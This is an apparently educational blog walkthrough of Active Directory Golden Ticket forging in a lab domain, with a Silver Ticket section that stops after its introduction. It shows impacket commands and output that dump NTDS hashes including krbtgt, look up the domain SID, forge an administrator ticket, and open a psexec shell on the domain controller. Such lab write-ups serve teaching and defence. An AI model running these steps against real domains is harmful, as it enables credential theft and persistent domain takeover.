---
layout:	post
title:  "AD Post-Attacks: Ticket-Forging Attacks"
date:   2024-07-26 11:11:11 +0200
categories: [Active Directory]
tags: [Active Directory]
---

## Pre-requisites

[AD: Fundamentals (venuschhantel.com.np)](https://venuschhantel.com.np/posts/AD_Fundamentals/)

[AD: Kerberos Authentication (venuschhantel.com.np)](https://venuschhantel.com.np/posts/AD_Kerberos_Authentication/)

<br>

## AD Environment

The AD environment for the ticket-forging attacks walkthrough is illustrated in the image below.

![AD Environment](/images/2024-07-25-AD_Post_Attacks_Ticket_Stealing_Attacks/1.png)

<br>

## Golden Ticket

### Introduction

If you follow my [Kerberos Authentication](https://venuschhantel.com.np/posts/AD_Kerberos_Authentication/) blog, then at Step 2, AS sends TGT to user. The TGT is encrypted with TGT Secret Key which is derived from krbtgt account password.

If attacker gain access to hash of krbtgt account, they can forge their own TGT ticket for persistence, which is golden ticket.

<br>

### Golden Ticket Walkthrough

For the walkthrough, it will be assumed that the ape user is already compromised by the hecker. Also, impacket tool will be used in this walkthrough. 

As mentioned above, to forge the golden ticket it require hash of krbtgt account. The hash of krbtgt was dumped as shown below. 

```bash
$ impacket-secretsdump ape:not@pe@123@192.168.190.130

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:064fbbe5db9939f23459813a58e24a78:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ff99a9aaf9780bb473a16a218c7a3848:::
```

The hash of krbtgt account was found to be`ff99a9aaf9780bb473a16a218c7a3848`. 

Also, to forge the ticket using impacket, it require domain SID, which was retrieved as shown below.

```bash
$ impacket-lookupsid APEWITHINTERNET.local/ape:not@pe@123@192.168.190.130
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Brute forcing SIDs at 192.168.190.130
[*] StringBinding ncacn_np:192.168.190.130[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1291692606-1804568322-956044965
```

The domain SID was found to be `S-1-5-21-1291692606-1804568322-956044965`.

Now we have the domain SID and krbtgt account hash, golden ticket was forged for administrator account. 

```bash
$ impacket-ticketer -nthash ff99a9aaf9780bb473a16a218c7a3848 -domain-sid S-1-5-21-1291692606-1804568322-956044965 -domain APEWITHINTERNET.local administrator
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for APEWITHINTERNET.local/administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in administrator.ccache
```

The forged ticket is `administrator.ccache`, which was exported to current bash session.

```bash
$ export KRB5CCNAME=/home/kali/administrator.ccache
```

Using the ticket, the administrator account was accessed via using psexec.

```bash
$ impacket-psexec APEWITHINTERNET.local/administrator@DC.APEWITHINTERNET.local -k -no-pass
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on DC.APEWITHINTERNET.local.....
[*] Found writable share ADMIN$
[*] Uploading file DOwZprhb.exe
[*] Opening SVCManager on DC.APEWITHINTERNET.local.....
[*] Creating service Uaqk on DC.APEWITHINTERNET.local.....
[*] Starting service Uaqk.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.587]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

<br>

## Silver Ticket

### Introduction

If you follow my [Kerberos Authentication](https://venuschhantel.com.np/posts/AD_Kerberos_Authentication/) blog, then at Step 4, after validating TGT and User Authenticator message, TGS sends Service Ticket to user. The Service Ticket is encrypted with Service Secret which is derived from service account password associated with a SPN. 

If attacker gain access to hash of service account associated with a SPN, they can forge their own Service Ticket ticket for persistence, which is silver ticket.
